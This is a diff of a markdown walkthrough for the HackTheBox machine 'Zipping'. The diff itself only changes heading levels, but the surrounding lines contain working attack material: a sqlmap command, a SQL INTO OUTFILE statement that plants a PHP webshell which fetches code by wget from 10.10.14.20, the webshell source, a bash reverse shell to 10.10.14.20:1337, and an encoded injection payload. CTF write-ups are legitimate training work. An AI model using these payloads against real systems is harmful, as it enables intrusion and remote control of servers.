@@ -9,7 +9,7 @@ tags: SQLI Binary_exploitation zip_symlink_abuse LFI
 
 This machine the difficulty is medium by hackthebox.The creator for this box machine is [xdann1](https://app.hackthebox.com/users/535069) . So now i would give your walkthrough for this machine.I hope you enjoy : )
 
-# Enumeration
+## Enumeration
 <a id="item-one"></a>
 
 
@@ -76,7 +76,7 @@ Only port 80 and 22 only open so nothing important here
  The zipping path is `/var/www/html` and `/var/www/html/shop` lets try get the code . But i so lazy create files one by one to Read the file . So now im using the tools to read the file because its save time 
 <a id="item-two"></a>
 
-# Local File Inclusion
+## Local File Inclusion
 
 
 
@@ -215,7 +215,7 @@ The first two tests behave as we would expect- 1 passes the filter and test does
 
 
 <a id="item-three"></a>
-# SQL Injection (Automation)
+## SQL Injection (Automation)
 
 `sqlmap -u "http://zipping.htb/shop/index.php?page=product&id=1" --fresh-queries --prefix="%0A%0D'" --suffix="'1" -p id --dbms mysql --level 2 --risk 2 --sql-shell --time-sec 1 --batch`
 
@@ -233,7 +233,7 @@ so now i just need upload mywebshell to the website
 `select '<?php system(''wget http://10.10.14.20/rcea.php''); ?>' INTO OUTFILE '/var/lib/mysql/shel.php%00';`
 (upload webshell or RCE)
 
-### rcea.php file
+`rcea.php`
 <?php system($_REQUEST["cmd"]); ?>
 
 to upload the webshell go to `page=/var/lib/mysql/shel` without .php because already appended so you just see blank right?that mean its uploading so to access the webshell at /shop path because u can see the below
@@ -254,7 +254,7 @@ bash -i >& /dev/tcp/10.10.14.20/1337 0>&1
 &nbsp;
 
 <a id="item-four"></a>
-# SQL Injection (Manual)
+## SQL Injection (Manual)
 
 ![](../../../../images/2024-01-19-15-57-05.png)
 &nbsp;
@@ -277,7 +277,7 @@ i uploaded shell from sql injection and i got rce `%0A%0D';SELECT+'<%3fphp+syste
 
 
 <a id="item-five"></a>
-# Privilege Escalation
+## Privilege Escalation
 
 sudo -l 
 
